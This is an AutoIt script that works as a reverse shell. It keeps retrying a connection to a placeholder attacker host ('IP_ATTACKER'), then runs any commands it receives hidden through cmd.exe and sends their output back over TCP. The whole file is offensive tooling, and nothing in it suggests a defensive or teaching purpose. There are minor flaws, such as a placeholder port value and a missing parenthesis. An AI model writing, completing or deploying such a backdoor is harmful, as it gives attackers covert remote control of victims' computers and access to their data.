#include <AutoItConstants.au3>
#include <GUIConstantsEx.au3>
#include <MsgBoxConstants.au3>

Global $host = "IP_ATTACKER"
Global $port = LISTEN_PORT!!!!

Global $currentDir = @WorkingDir

While 1
    If Ping($host, 250) Then ; Check if the server is reachable
        TCPStartup()
        $socket = TCPConnect($host, $port)
        If $socket <> -1 Then ; Check if the connection is successful
            ExitLoop ; Exit the loop if the connection is established
        EndIf
        TCPCloseSocket($socket)
        TCPShutdown()
    EndIf
    Sleep(1000) ; Wait for 1 second before retrying
WEnd

TCPSend($socket, $currentDir & "> ")
While 1
    If @error Then ExitLoop
    $recv = TCPRecv($socket, 1024)
    If $recv <> "" Then
        If StringLeft($recv, 3) = "cd " Then ; Check if the command is a change directory command
            $dirToChange = StringTrimLeft($recv, 3)
            $dirToChange = StringStripWS($dirToChange, 3) ; Remove leading/trailing whitespaces
            If FileChangeDir($dirToChange) Then
                $currentDir = @WorkingDir
                TCPSend($socket, $currentDir & "> ")
            Else
                TCPSend($socket, "[!] Failed to change directory" & @CRLF
                TCPSend($socket, $currentDir & "> ")
            EndIf
        Else
            $cmd = Run(@ComSpec & " /c " & $recv, "", @SW_HIDE, 2)
            $stdout = ""
            While @ComSpec & " /c " & $recv <> ""
                $line = StdoutRead($cmd)
                If @error Then ExitLoop
                $stdout &= $line
            WEnd
            $ret = TCPSend($socket, $stdout)
            TCPSend($socket, $currentDir & "> ")
            Sleep(500)
        EndIf
    EndIf
WEnd

TCPCloseSocket($socket)
TCPShutdown()